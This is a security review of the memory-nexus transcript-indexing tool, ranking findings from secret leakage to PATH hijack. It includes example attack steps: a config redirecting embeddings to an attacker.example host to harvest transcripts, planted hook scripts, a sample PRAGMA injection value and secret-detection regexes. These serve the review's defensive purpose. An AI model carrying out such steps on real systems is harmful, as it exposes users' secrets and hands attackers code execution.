# Adversarial Security Review — 2026-04-26

**Reviewer angle:** Threat model — secrets leakage, injection, access control, sensitive-data handling
**Scope:** `~/Projects/memory-nexus/` (`@chude/memory` v2.0.0)
**Method:** Static analysis of `src/` — ingest pipeline, repositories, search services, CLI commands, hook scripts, embedding providers, log writers, config writers, child-process spawn sites.

## Summary

The security posture is **weak by design** for the data sensitivity at hand. memory-nexus ingests, indexes, and re-emits the entire content of Claude Code session transcripts — including tool-call inputs/outputs that routinely contain `printenv` dumps, file contents, API responses, accidentally-pasted secrets, and SSH keys — and applies **zero redaction, zero classification, and zero scoping** at any stage of the pipeline. Search defaults to cross-project, the database is plaintext SQLite with default umask, the friction-log path explicitly invites Claude to write free-form descriptions about "what just went wrong" without any guard against echoing the secret that caused the failure, and an `--export` command serializes the entire corpus to an attacker-chosen path with no warning. There is no SQL injection in the hot path (parameterized statements throughout), no command injection in the spawn sites (array-form spawn used consistently), and the FTS5 query sanitizer is reasonable. The risk is not that an attacker breaks in; the risk is that the tool faithfully indexes and exports its own users' secrets and surfaces them across project boundaries.

## Findings (severity-ranked)

### CRITICAL — 4

#### CRIT-1: Zero secret redaction during ingest — full transcript content stored verbatim

- **File(s):** `src/infrastructure/parsers/event-classifier.ts:179-236, 320-362`; `src/infrastructure/database/repositories/message-repository.ts:117-126`; `src/infrastructure/database/repositories/tool-use-repository.ts` (entire `save` path); `src/infrastructure/parsers/jsonl-parser.ts:29-63`
- **Threat:** Every transcript line — user prompts, assistant responses, tool inputs (Bash commands), tool results (file dumps, env vars, API responses, error messages with stack traces and tokens) — is JSON-stringified at line 358 (`event-classifier.ts`) and inserted unmodified into `messages_meta.content` and `tool_uses.input`/`tool_uses.result`. There is no detection step (regex for `sk-...`, `ghp_...`, `tskey-...`, `Bearer `, `password=`, `AWS_ACCESS_KEY_ID`, JWT shape, base64 PEM blocks, etc.), no classifier hook, no allowlist of safe tool names, no redaction of tool-result blocks specifically. The `SKIP_TYPES` set (`event-classifier.ts:25-38`) skips only progress/image events — semantic content is always kept.
- **Exploit scenario:** User runs `/printenv` or `Bash: cat .env` mid-session, or pastes an error message containing `Authorization: Bearer sk-proj-abc...`, or Claude reads a credentials file to debug. The next `memory sync` ingests that JSONL line. The secret is now in `~/.local/share/memory/memory.db` indefinitely, queryable via `memory search "sk-"`, exportable via `memory export`, and subject to all downstream propagation paths (CRIT-2, CRIT-3, HIGH-1).
- **Impact:** Persistent at-rest leakage of every secret that has ever transited any Claude Code session. Compounds over time: a six-month-old API key the user has long since forgotten about and not rotated is fully recoverable from the index. Cross-project: a secret pasted in `medesine-rx` is searchable from `conversations`.
- **Mitigation:** Implement an `IRedactor` port at the domain layer with a default infrastructure adapter that runs detect-and-mask on `content` before `messageRepo.save()` and on `tool_uses.input`/`result` before `toolUseRepo.save()`. Redaction patterns at minimum: AWS keys (`AKIA[0-9A-Z]{16}`), OpenAI (`sk-[a-zA-Z0-9-]{20,}`), Anthropic (`sk-ant-[a-zA-Z0-9-_]{30,}`), GitHub (`gh[ps]_[A-Za-z0-9]{36}`), Tailscale (`tskey-(auth|client)-[a-zA-Z0-9-]+`), Bearer tokens, JWTs (`eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`), PEM blocks, `(?:password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*\S+`. Replace match with `[REDACTED:<type>:<8-char-hash>]` so collisions are detectable but values are not. Make redaction default-on with `--no-redact` opt-out and a friction-log warning when used. Persist redaction-rule version with each row to allow re-redaction passes when patterns improve.

#### CRIT-2: Embedding pipeline transmits unredacted secrets to OpenAI / arbitrary HTTP endpoints

- **File(s):** `src/infrastructure/embedding/openai-provider.ts:60-71, 100-111`; `src/infrastructure/embedding/embedding-provider-factory.ts` (constructs from config); `src/presentation/cli/commands/sync/embedding-pass.ts:107-110` (calls `embedUnembedded`)
- **Threat:** When the user enables embedding with `provider: "openai"` (config field at `config-manager.ts:50`), every `messages_meta.content` row is fetched and POSTed to `https://api.openai.com/v1/embeddings` (or any `baseUrl` override) as the `input` field. There is no pre-embedding redaction, no length cap to prevent leakage of large file dumps, and no opt-in confirmation that the user understands transcript content is being externalized.
- **Exploit scenario:** A transcript message contains `tool_result` with `printenv` output including `STRIPE_LIVE_KEY=sk_live_...`. The user later sets `provider: openai` in config (perhaps because local embedding is slow). `memory sync --embed` runs. The full secret-bearing message is sent to OpenAI's embeddings endpoint, where it is logged per OpenAI's data-retention policy. Even if OpenAI promises not to train on API data, the secret has now crossed a network boundary and lives in third-party logs.
- **Impact:** Network-egress leakage of the entire indexed corpus to a third-party API. Indistinguishable from intentional exfiltration to an outside observer of network traffic. Compounded by `baseUrl` override (line 42 of `openai-provider.ts`) — an attacker who modifies `~/.config/memory/config.json` can redirect all embeddings to `https://attacker.example/embeddings` and harvest the entire transcript history during the next `memory sync --embed`.
- **Exploit walkthrough:**
  1. Attacker gains shell access (or compromises any process with write to `~/.config/`).
  2. Attacker writes `{"embedding":{"enabled":true,"provider":"openai","apiKey":"any","baseUrl":"https://attacker.example"}}` to `~/.config/memory/config.json`. No file permission check resists this (CRIT-4).
  3. User runs `memory sync --embed` (or hook fires it automatically).
  4. Every unembedded message is POSTed to attacker's endpoint, including secrets, internal architecture details, and PII.
- **Mitigation:** (a) Apply the redactor from CRIT-1 to the input text *before* `embed()` is called, in `EmbeddingService` or in a wrapper provider. (b) Validate `baseUrl` against an allowlist (`api.openai.com`, plus any explicit user-listed hosts in `config.json` with a separate `embedding.allowedHosts` field that the user must opt into). (c) On first use of any non-local provider, emit a one-time confirmation that embeddings are leaving the machine. (d) Add a global `redactBeforeEmbed: true` default to config.

#### CRIT-3: Cross-project search has no default scoping — surfaces any project's content from any query

- **File(s):** `src/infrastructure/database/services/search-service.ts:54-68, 119-188`; `src/presentation/cli/commands/search.ts:286-298` (no default `projectFilter`); `src/application/services/friction-service.ts:96-112` (same shape)
- **Threat:** `memory search "<query>"` runs FTS5 MATCH against `messages_fts` with no project predicate by default. `--project` is opt-in (line 120 of `search.ts`) and only applied as a `LIKE` substring match if explicitly provided. The user's stated working assumption ("a query in one project can surface content from any other project's session") is the actual implementation, and there is no warning, no scope indicator in output, and no mechanism to mark a project as "isolated."
- **Exploit scenario:** User is working in `client-x` project. They run `memory search "password"` to find a discussion about a hashing strategy. The result set includes hits from `client-y`, `medesine-rx`, and `personal-notes`, including snippets of secrets that were ingested per CRIT-1. The user (or an AI agent with shell access in this project) now sees content they had no need-to-know access to. The same applies to a Claude agent invoked in `client-x` running `memory search` as part of its workflow — it pulls cross-tenant data into its context window.
- **Impact:** Lateral information exposure across project boundaries. Maps to OWASP A01 (Broken Access Control) — there is no access control because there are no boundaries. For a user working under NDA on multiple clients, this is a contractual breach risk: client-A's transcript content can surface in a session for client-B.
- **Mitigation:** Default `projectFilter` to the current `process.cwd()`-resolved project name (mirror the resolution in `ambient.ts:54-58`). Require `--all-projects` or `--project=<other>` to cross the boundary. Annotate every result row with its source project in the output formatter so the user can always see when a cross-project result appears. For agent-invoked use, set `MEMORY_AGENT=1` env var convention and refuse cross-project queries unless `--all-projects` is explicit.

#### CRIT-4: Database, config, and exported backup files written with default umask — no permission hardening

- **File(s):** `src/infrastructure/database/connection.ts:122-124, 138` (DB creation via `bun:sqlite` — no mode flag passed; `mkdirSync` default mode); `src/infrastructure/hooks/config-manager.ts:344` (`writeFileSync(configPath, ...)` — no `mode` option, so file inherits process umask, typically `0o644`); `src/application/services/export-service.ts:300` (`Bun.write(outputPath, jsonContent)` — outputPath is user-supplied, no permission setting); `src/infrastructure/hooks/log-writer.ts:111-120`; `src/infrastructure/embedding/background-embedder.ts:87` (lockfile)
- **Threat:** On a multi-user system (or a system where any process running as the same user becomes the threat model — supply-chain compromise, malicious npm package, cross-tenant container escape), `memory.db` containing the full plaintext transcript history is world-readable by default. The config file containing `apiKey` (line 50, `config-manager.ts`, `EmbeddingConfigData.apiKey?: string`) is similarly readable. Exported JSON backups land at user-chosen paths (which may be `/tmp` — readable by other users on shared hosts) without any permission restriction.
- **Exploit scenario:** User exports a backup to `/tmp/memory-backup.json` to copy to another machine. On a shared host (university lab, container, etc.), any other user can `cat` the file before the user moves it. Same applies to `~/.local/share/memory/memory.db` — readable by `other` if the user's umask is the typical `0o022`.
- **Impact:** At-rest leakage of the entire transcript corpus and any stored API keys to unprivileged users on the same host. Most acute on shared CI runners, jump hosts, and dev VMs.
- **Mitigation:** (a) On DB creation in `initializeDatabase`, after `new Database(path, {create})`, call `chmodSync(path, 0o600)` (and same for `${path}-wal`, `${path}-shm` after WAL is enabled). (b) `writeFileSync` for config should pass `{mode: 0o600}`. (c) `exportToJson` should warn if `outputPath` is in a world-readable directory and chmod the output to `0o600` post-write. (d) Document the at-rest leakage in README and recommend full-disk encryption / per-user dirs.

### HIGH — 5

#### HIGH-1: Friction-log description field stored verbatim — invites Claude-self-leakage

- **File(s):** `src/presentation/cli/commands/friction/log.ts:22-30`; `src/application/services/friction-service.ts:72-85`; `src/infrastructure/database/repositories/friction-repository.ts:49-83`; `src/application/services/friction-service.ts:222-260` (auto-ingest from `friction.jsonl`)
- **Threat:** The friction-log convention asks Claude during a session to record what just went wrong. The fields `description`, `context`, and `tool` flow straight into the SQLite `friction_log` table without sanitization. Per the global rule `tool-friction.md`, a description is expected to be free-form. There is nothing in the pipeline that detects when Claude pastes a secret-bearing error message into the description (e.g., "auth failed: 401 Unauthorized — Bearer sk-ant-abc123 not valid"). The auto-ingest path (`ingestFallbackFile`) reads JSONL from disk and feeds each line into `log()` with no validation.
- **Exploit scenario:** Claude runs `Bash: curl -H "Authorization: Bearer $TOKEN" ...` and gets a 401. The error message includes the bearer token. Per the rule, Claude logs friction: `memory friction log "auth failed: 401 — Bearer sk-ant-abc123 invalid" --severity high`. The token is now in `friction_log.description` permanently, dumpable via `memory friction list --all`, exportable, embeddable, etc.
- **Impact:** A pipeline expressly designed for Claude to write into is the highest-bandwidth secret-leak channel in the system. The convention encourages the model to be detailed, which encourages secret inclusion.
- **Mitigation:** Apply the CRIT-1 redactor to `description`, `context`, and any free-form fields at the application-service layer (`FrictionService.log()`). Reject entries where post-redaction the description is >50% redacted (suggests the model was trying to paste raw output). Document in the friction-log spec that descriptions must be paraphrased, not pasted.

#### HIGH-2: Friction `purge --pattern` constructs unescaped regex from user input — ReDoS risk

- **File(s):** `src/presentation/cli/commands/friction/purge.ts:27-31`
- **Threat:** The dry-run preview converts the user-supplied LIKE pattern into a regex by replacing `%` with `.*` and `_` with `.`, then anchoring with `^...$`. Other regex metacharacters (`(`, `)`, `+`, `?`, `\`, `|`, `[`, `]`, `{`, `}`) are passed through unescaped. A user who types a pattern like `(.+)+%` or `(a+)+a` triggers catastrophic backtracking on long descriptions.
- **Exploit scenario:** User (or attacker who has CLI access) runs `memory friction purge --pattern "(a+)+!" --dry-run`. The regex `^(a+)+!$` is matched against every description in the table. If any description is ~30 chars of `aaa...` ending in something other than `!`, the regex engine will backtrack exponentially. CPU spikes; on large tables, indefinite hang.
- **Impact:** Local DoS. Not remote-exploitable, but a foot-gun: a typo can hang the CLI. Also a smell — the dry-run regex doesn't actually mirror SQL LIKE semantics for these characters.
- **Mitigation:** Escape all regex metacharacters except `%` and `_` before substitution: `pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/%/g, '.*').replace(/_/g, '.')`. Better: do the dry-run by running the same parameterized `LIKE` against a SELECT and counting (`SELECT COUNT(*) FROM friction_log WHERE description LIKE $pattern`) — no regex needed.

#### HIGH-3: `bun run "${hookScriptPath}"` written into Claude Code settings — XDG_DATA_HOME hijack

- **File(s):** `src/infrastructure/hooks/settings-manager.ts:233-243, 269-280`; `src/infrastructure/paths.ts:82-92` (XDG_DATA_HOME read at runtime); `src/infrastructure/hooks/settings-manager.ts:147-149` (path resolution)
- **Threat:** During `memory install`, the script writes `bun run "<hookScriptPath>"` into `~/.claude/settings.json`. `hookScriptPath` is derived from `XDG_DATA_HOME` at install time (`paths.ts:82-92`). If `XDG_DATA_HOME` is attacker-influenced at install time (e.g., a rogue shell-init script, or a temporarily-modified env in a CI runner), the resulting settings.json line will execute attacker-controlled code on every Claude Code session start/end.
- **Exploit scenario:** Attacker drops a `.bashrc` line `export XDG_DATA_HOME=/tmp/evil` shortly before user runs `memory install`. Install writes `bun run "/tmp/evil/memory/hooks/sync-hook.js"` into settings.json. Attacker plants their script at that path. Every subsequent SessionEnd hook invocation runs attacker code with the user's full privileges.
- **Impact:** Privilege escalation against the user — any process that can transiently set `XDG_DATA_HOME` before `memory install` runs gains persistent code execution. This is a defense-in-depth gap, not a fresh access path, but the attack window is "any one-time write to env vars" which is broader than expected.
- **Mitigation:** During `install`, resolve and canonicalize the hook path, then assert it lives under `homedir()` and that the hook script file already exists and is owned by the current user. Reject install if `XDG_DATA_HOME` resolves outside the home dir. Optionally, require an explicit `--hook-dir <path>` flag and refuse to read XDG env vars during install.

#### HIGH-4: `spawnBackgroundSync` defaults `command = "aidev"` — PATH hijack via auto-fired hook

- **File(s):** `src/infrastructure/hooks/hook-runner.ts:91-122` (default `command = "aidev"`); `src/infrastructure/hooks/sync-hook-script.ts:156` (called from hook with no command override)
- **Threat:** The hook-fired sync runs `spawn("aidev", ["memory", "sync", "--session", sessionId], …)` with no path qualification. Resolution depends on PATH. If a directory writable by an attacker (e.g., `~/bin` precedes `/usr/local/bin` due to a custom shell init) appears earlier in PATH and the attacker plants an `aidev` executable, the hook fires it on every Claude Code SessionEnd.
- **Exploit scenario:** Attacker drops `~/bin/aidev` containing `#!/bin/bash; exfil...`. Next time the user closes a Claude Code session, the hook spawns the malicious aidev with the live `MEMORY_HOOK=1` env and inherited environment.
- **Impact:** Auto-fired code execution, triggered by routine user activity. Same severity as HIGH-3 but a different access path (PATH ordering rather than XDG vars).
- **Mitigation:** Resolve `aidev` once at hook-install time (via `which aidev`), assert the resolved path is owned by root or the current user, and bake the absolute path into the hook command. Refuse install if `aidev` cannot be resolved or resolves to a user-writable directory.

#### HIGH-5: No global lock around `memory sync` — concurrent runs can produce inconsistent extraction state

- **File(s):** `src/presentation/cli/commands/sync/index.ts:69-167`; `src/infrastructure/embedding/background-embedder.ts:73-179` (lock exists for embedding, NOT for sync); `src/application/services/sync-service.ts` (no lock)
- **Threat:** Two `memory sync` runs (e.g., one fired by a SessionEnd hook for project A, one fired manually during overlapping work in project B) share the same SQLite file. WAL mode + `busy_timeout=5000` will prevent corruption but not logical races: the FileCheckpointManager (`src/infrastructure/signals/`) writes JSON to a single file and one run can overwrite the other's checkpoint mid-flight.
- **Exploit scenario:** User opens two Claude Code sessions; both close near-simultaneously. Both hooks fire. Both `memory sync` runs interleave. Run A completes 50 sessions and writes a checkpoint. Run B, started slightly later, sees an inconsistent checkpoint and either re-extracts work A already did (waste) or skips work it shouldn't (data loss). Worse: run B may write a checkpoint that run A's continuation later reads, creating a stable wrong state.
- **Impact:** Data integrity, not confidentiality. Extraction-state row in the DB may end up "complete" while messages are missing, silently dropping content from the index.
- **Mitigation:** Apply the same PID-lock pattern from `background-embedder.ts:151-179` to the top-level sync run. On contention, the second run logs and exits cleanly rather than racing.

### MEDIUM — 4

#### MED-1: `verbose` mode echoes content to stderr without a redact pass

- **File(s):** `src/presentation/cli/commands/sync/helpers.ts:166-170` (`err.error` echoed); `src/presentation/cli/formatters/error-formatter.ts` (verbose includes stack traces with content snippets); `src/infrastructure/hooks/log-writer.ts:67` (LogEntry has optional `error` field)
- **Threat:** When `--verbose` is set or sync errors occur, full error messages are printed to stderr and appended to `sync.log`. JSONL parse errors include a slice of the malformed line (`jsonl-parser.ts:59`), which may include parts of secret-bearing transcript content.
- **Mitigation:** Apply the redactor to all logged strings. In `formatError`, truncate any field value to 200 chars and run redaction on the result.

#### MED-2: `memory export <path>` writes full unencrypted backup with no warning

- **File(s):** `src/application/services/export-service.ts:195-300`; `src/presentation/cli/commands/export.ts`
- **Threat:** Single CLI invocation produces a JSON file containing all `sessions`, `messages`, `tool_uses`, `entities`, `links`, `session_entities`, `entity_links`, `extraction_states`. No confirmation prompt, no warning that the file contains secrets per CRIT-1, no compression, no encryption, no scope filter.
- **Exploit scenario:** User intends to back up "their conversations" and runs `memory export ~/Dropbox/backup.json`. The file syncs to Dropbox cloud storage. Dropbox is now custodian of every secret ever logged by Claude in any session.
- **Mitigation:** Require explicit `--include-content` flag to dump message content; default to a metadata-only export (sessions, entities, links, but `messages.content` redacted to 100-char prefix). Prompt for confirmation when running interactively. Set `0o600` on the output file. Refuse to write to common cloud-sync paths (`~/Dropbox`, `~/iCloudDrive`, `~/OneDrive`) without `--allow-cloud-path`.

#### MED-3: SQLite PRAGMA values from config built via string interpolation

- **File(s):** `src/infrastructure/database/connection.ts:184, 188`
- **Threat:** `db.exec(\`PRAGMA busy_timeout = ${busyTimeout};\`)` and `db.exec(\`PRAGMA cache_size = ${cacheSize};\`)` use template literals. These values come from `DatabaseConfig` defaults. If a future caller exposes `DatabaseConfig` to user input (e.g., via a CLI flag or config file field), an attacker could inject SQL via these values: `busyTimeout = "0; ATTACH DATABASE '/tmp/x.db' AS evil"`. Currently not reachable from user input, but the pattern is unsafe.
- **Mitigation:** Validate `busyTimeout` and `cacheSize` are integers via `Number.isSafeInteger(...)` before interpolation, or use bound parameters via a temporary prepared statement (PRAGMAs don't accept bound params directly — so input validation is the only path).

#### MED-4: `loadConfig`, `loadClaudeSettings`, `readLock` silently swallow JSON parse errors

- **File(s):** `src/infrastructure/hooks/config-manager.ts:333-337`; `src/infrastructure/hooks/settings-manager.ts:165-170`; `src/infrastructure/embedding/background-embedder.ts:99-103`
- **Threat:** When a config or lock file is malformed, the loaders return `{}` or `null` and proceed with defaults. An attacker who can write an invalid JSON to `~/.config/memory/config.json` can force the tool to fall back to defaults silently. While not a leak path on its own, it disables defensive config (e.g., `autoSync: false` becomes `autoSync: undefined → defaults to enabled`).
- **Mitigation:** On JSON parse failure, log a warning to stderr and exit non-zero rather than silently fall back to defaults. Defense in depth: verify config file ownership and permissions before reading.

### LOW — 3

#### LOW-1: README publishes the database location explicitly — recon assist

- **File(s):** `README.md`, `src/infrastructure/paths.ts:140-142`
- **Threat:** Public docs and source advertise that the DB lives at `~/.local/share/memory/memory.db`. An attacker who lands on a target host already knows where to look.
- **Mitigation:** Informational only. Acceptable risk; no action required.

#### LOW-2: `qmd-runner` uses `which qmd` — non-portable to Windows

- **File(s):** `src/infrastructure/external/qmd-runner.ts:72, 84, 98, 111`
- **Threat:** `execSync("which qmd")` will fail on a default Windows shell (no `which`). Not a security risk, but a portability bug that can mask other issues; also, on a system where `which` resolves to a user-writable path (rare), it would resolve through that.
- **Mitigation:** Use `command -v qmd` on POSIX and `where qmd` on Windows, or skip the check and rely on spawn's ENOENT.

#### LOW-3: Test fixtures contain `apiKey: "sk-test-key"` in source

- **File(s):** `src/infrastructure/embedding/openai-provider.test.ts:81+`; `src/infrastructure/database/health-checker.test.ts:550, 577`; `src/infrastructure/hooks/config-manager.test.ts:429-433`
- **Threat:** Strings like `sk-test-key` are committed. They are not real keys, but a future careless replacement with a real key during debugging would commit a real secret. Pre-commit secret-scanners often flag the `sk-` prefix even on test fixtures.
- **Mitigation:** Rename fixture keys to `test-not-a-real-key-12345` to avoid both the appearance and the gitleaks/talisman flag.

## What's Done Well

- **Parameterized SQL throughout the hot path.** Repository code uses `db.prepare(...).run({ $param: value })` or positional `?` consistently. No string concatenation of user values into SQL in any repo I inspected. This is the single most important defense, and it's present.
- **`spawn` uses array-form arguments**, not `exec()` with a shell string. This neutralizes command injection through query strings, session IDs, or file paths in `qmd-runner.ts`, `claude-summary-generator.ts`, `hook-runner.ts`, and `background-embedder.ts`.
- **FTS5 query sanitizer (`fts-sanitizer.ts`) is reasonable** and handles balanced quotes and operator characters defensively. It is not a SQL-injection surface — `MATCH ?` is a bound parameter — but the sanitizer prevents query-syntax errors that would surface as crashes.

## Open Questions

These could not be determined without runtime testing or specific access:

1. **Does `bun:sqlite`'s `Database` constructor honor a `mode` flag for newly-created files?** I did not find documentation in the source. If it does, mitigation for CRIT-4 is a one-line fix; if not, post-create `chmodSync` is the path.
2. **What is the actual file mode applied by `writeFileSync` on Windows?** Unix umask doesn't apply; ACLs may inherit from the parent dir. Needs runtime verification on the Windows desktop where this tool runs.
3. **Does the OpenAI embeddings endpoint log request bodies?** Anthropic's stance is published; OpenAI's varies by tier. The risk surface in CRIT-2 depends on the answer; mitigation does not.
4. **Are there other call sites of `IEmbeddingProvider` beyond OpenAI?** I read the OpenAI provider and the Ollama provider import was visible but not inspected. Same redaction discipline must apply at any provider boundary.
5. **Is the `memory friction` CLI's auto-ingest path (`ingestFallbackFile`) reachable from session-start hooks?** If yes, CRIT-1 + HIGH-1 compose: every session start may slurp `~/.claude/friction.jsonl` (which agents may have populated unsafely) into the durable store with no redaction.
6. **Does `messages_fts` index expose secret strings to side-channel inference even after a future redaction is applied?** FTS5 stores tokenized terms. If we redact retroactively, the FTS5 index must be rebuilt — a vacuum/reindex pass — otherwise terms from pre-redaction data remain searchable.
